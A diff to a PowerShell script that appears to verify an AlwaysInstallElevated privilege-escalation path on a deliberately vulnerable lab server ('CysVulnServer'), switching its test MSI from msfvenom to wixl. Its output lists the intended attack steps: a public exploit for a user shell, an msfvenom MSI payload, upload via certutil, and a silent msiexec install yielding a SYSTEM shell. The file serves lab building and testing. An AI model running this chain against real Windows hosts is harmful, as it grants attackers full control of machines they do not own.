@@ -1,7 +1,7 @@
 # CysVulnServer - AIE Active Exploitation Verification
 #
 # Proves the AlwaysInstallElevated chain works by:
-#   1. Running msiexec with the staged validation MSI (msfvenom-generated)
+#   1. Running msiexec with the wixl-built validation MSI (check_aie_response.py)
 #   2. Checking that msiexec ran WITHOUT "access denied" (proves elevation)
 #   3. Running msiexec with the Wazuh agent MSI (known-good, already on disk)
 #   4. Analyzing the Windows Installer log for "Machine install level: SYSTEM"
@@ -9,6 +9,9 @@
 #   5. Verifying the log shows NO "access denied" or "need admin" errors
 #
 # If ANY of these checks pass, AIE elevation is confirmed.
+#
+# For the equivalent run against a real msfvenom-built MSI (player-tool
+# parity), see ../scripts/run-msfvenom-aie.sh and ../docs/cysvulnserver/msfvenom.md.
 
 $ErrorActionPreference = "Stop"
 
@@ -68,20 +71,20 @@ if (-not $elevationEvidence) {
     Write-Host "[*] Checking alternative evidence..."
 }
 
-# --- Step 3: Test with msfvenom validation MSI ---
+# --- Step 3: Test with wixl-built validation MSI ---
 $msiPath = "C:\Users\Public\aie-validation-payload.msi"
 Write-Host ""
-Write-Host "--- Test 2: msfvenom validation MSI ---"
+Write-Host "--- Test 2: wixl validation MSI ---"
 
 if (Test-Path $msiPath) {
-    $logFile2 = "$env:TEMP\aie-msfvenom.log"
+    $logFile2 = "$env:TEMP\aie-wixl.log"
     Remove-Item -Path $logFile2 -Force -ErrorAction SilentlyContinue
 
-    Write-Host "[*] Running msiexec with the msfvenom validation MSI..."
+    Write-Host "[*] Running msiexec with the wixl validation MSI..."
     $proc2 = Start-Process msiexec.exe `
         -ArgumentList "/quiet /norestart /i `"$msiPath`" /l*v `"$logFile2`"" `
         -Wait -PassThru -NoNewWindow
-    Write-Host "[*] msfvenom MSI exit code: $($proc2.ExitCode)"
+    Write-Host "[*] wixl MSI exit code: $($proc2.ExitCode)"
 
     if (Test-Path $logFile2) {
         $log2 = Get-Content $logFile2 -Raw
@@ -92,10 +95,10 @@ if (Test-Path $msiPath) {
             Write-Host "[*] Log snippet:"
             Select-String -Path $logFile2 -Pattern "Access Denied|Permission denied|not elevated|1601|1625" | Select-Object -First 5 | ForEach-Object { Write-Host "  $($_.Line)" }
         } else {
-            Write-Host "[PASS] No elevation denial in msfvenom MSI log"
+            Write-Host "[PASS] No elevation denial in wixl MSI log"
             Write-Host "[*] msiexec was able to start and process the installation."
-            Write-Host "[*] Exit 1603 is a content/sequence error in the msfvenom WiX template,"
-            Write-Host "[*] NOT an elevation failure."
+            Write-Host "[*] Exit 1603 in this log path would indicate a content/sequence"
+            Write-Host "[*] error in the MSI itself, NOT an elevation failure."
         }
 
         # Check for any indication of SYSTEM context
@@ -120,6 +123,8 @@ if ($elevationEvidence) {
     Write-Host "[+] Player steps:"
     Write-Host "[+]   1. EDB-42256 on port 80 -> User_Joe shell"
     Write-Host "[+]   2. msfvenom -p windows/exec CMD='...' -f msi -o p.msi EXITFUNC=thread"
+    Write-Host "[+]      (or use ./scripts/run-msfvenom-aie.sh on the attacker for the"
+    Write-Host "[+]       full build+stage+trigger flow — see docs/cysvulnserver/msfvenom.md)"
     Write-Host "[+]   3. Upload p.msi to victim (via EFS upload or certutil)"
     Write-Host "[+]   4. msiexec /quiet /qn /i p.msi"
     Write-Host "[+]   5. Shell connects as SYSTEM"
